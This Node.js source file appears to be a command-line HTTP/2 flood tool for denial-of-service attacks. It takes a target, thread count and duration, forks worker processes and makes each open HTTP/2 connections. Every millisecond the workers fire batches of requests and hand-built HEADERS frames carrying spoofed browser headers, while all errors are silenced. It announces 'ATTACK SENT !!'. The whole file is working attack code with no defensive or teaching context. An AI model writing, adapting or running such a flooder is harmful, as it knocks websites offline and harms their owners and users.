const fs = require('fs');
const url = require('url');
const http2 = require('http2');
const cluster = require('cluster');
const { HeaderGenerator } = require('header-generator');
const HPACK = require('hpack');

let headerGenerator = new HeaderGenerator({
  browsers: [
    { name: "firefox", minVersion: 90, httpVersion: "2" },
    { name: "chrome", minVersion: 98, httpVersion: "2" }
  ],
  devices: ["desktop"],
  operatingSystems: ["windows"],
  locales: ["en-US", "en"]
});

let rawHeaders = headerGenerator.getHeaders();

if (process.argv.length <= 3) {
    console.log(` [ HOST ] [ THREAD ] [ TIME ]`);
    process.exit(-1);
}

var target = process.argv[2];
var parsed = url.parse(target);
var host = url.parse(target).host;
var threads = process.argv[3];
var time = process.argv[4];
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function (e) {});
process.on('unhandledRejection', function (e) {});

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    console.log(` ATTACK SENT !! `);
    setTimeout(() => {
        process.exit(1);
    }, time * 1000);
} else {
    setInterval(startflood);
}

const hys = [
  "host",
  "pragma",
  "cache-control",
  "sec-ch-ua",
  "sec-ch-ua-mobile",
  "sec-ch-ua-platform",
  "upgrade-insecure-requests",
  "user-agent",
  "accept",
  "sec-fetch-site",
  "sec-fetch-mode",
  "sec-fetch-user",
  "sec-fetch-dest",
  "referer",
  "accept-encoding",
  "accept-language",
];

const xys = Object.fromEntries(
  hys.filter(header => rawHeaders[header]).map(header => [header, rawHeaders[header]])
);

function encodeFrame(streamId, type, payload, flags = 0) {
    const payloadLength = Buffer.alloc(3);
    payloadLength.writeUIntBE(payload.length, 0, 3);
    const streamIdBuffer = Buffer.alloc(4);
    streamIdBuffer.writeUInt32BE(streamId & 0x7FFFFFFF);

    const frameHeader = Buffer.concat([
        payloadLength,
        Buffer.from([type]),
        Buffer.from([flags]),
        streamIdBuffer
    ]);

    return Buffer.concat([frameHeader, payload]);
}

function startflood() {
    const client = http2.connect(target, {
        initialWindowSize: 15663105,
        settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false,
    }
  });

    const codec = new HPACK();
    
    let headers = {
    ":path": parsed.path,
    ":method": "GET",
    ":authority": parsed.host,
    ":scheme": "https",
    ...xys,
  };

    const encodedHeaders = codec.encode(headers);

    const packed = Buffer.concat([
        Buffer.from([0x80, 0, 0, 0, 0xFF]),
        encodedHeaders
    ]);

    const requests = [];

    client.on("connect", () => {
        const intervalAttack = setInterval(() => {
            for (let i = 0; i < 30; i++) {
            const request1 = client.request(headers);
                const streamId = (i + 1) * 2;
                
                const frame = encodeFrame(streamId, 1, packed, 0x25);
                const requestPromise = new Promise((resolve, reject) => {
                });

                requests.push({ requestPromise, frame });

                client.request();
                client.push(frame);
                request1.end();
                request1.close();
            }
        }, 1);
    });

    client.on("error", error => {
        client.close();
        return;
    });

    setTimeout(() => {
        client.close();
    }, time * 1000);
}
